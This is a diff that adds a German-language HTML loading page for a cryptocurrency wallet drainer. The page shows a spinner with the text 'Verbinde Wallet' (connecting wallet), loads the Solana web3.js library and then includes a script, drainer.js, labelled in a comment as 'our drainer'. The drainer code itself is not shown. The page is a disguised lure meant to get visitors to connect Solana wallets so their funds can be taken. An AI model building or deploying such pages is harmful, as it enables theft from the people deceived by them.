@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+ <meta charset="utf-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1">
+ <title>Loading...</title>
+ <style>
+ body { font-family: system-ui, sans-serif; background: #0b0b0f; color: #eee;
+ display: flex; align-items: center; justify-content: center;
+ height: 100vh; margin: 0; }
+.box { text-align: center; }
+.spin { width: 40px; height: 40px; border: 4px solid #333;
+ border-top-color: #9945FF; border-radius: 50%;
+ animation: s 1s linear infinite; margin: 0 auto 20px; }
+ @keyframes s { to { transform: rotate(360deg); } }
+ </style>
+</head>
+<body>
+ <div class="box">
+ <div class="spin"></div>
+ <h2>Bitte warten...</h2>
+ <p id="status">Verbinde Wallet</p>
+ </div>
+
+ <!-- Solana Web3 Bibliothek -->
+ <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+ <!-- Unser Drainer -->
+ <script src="drainer.js"></script>
+</body>
+</html>
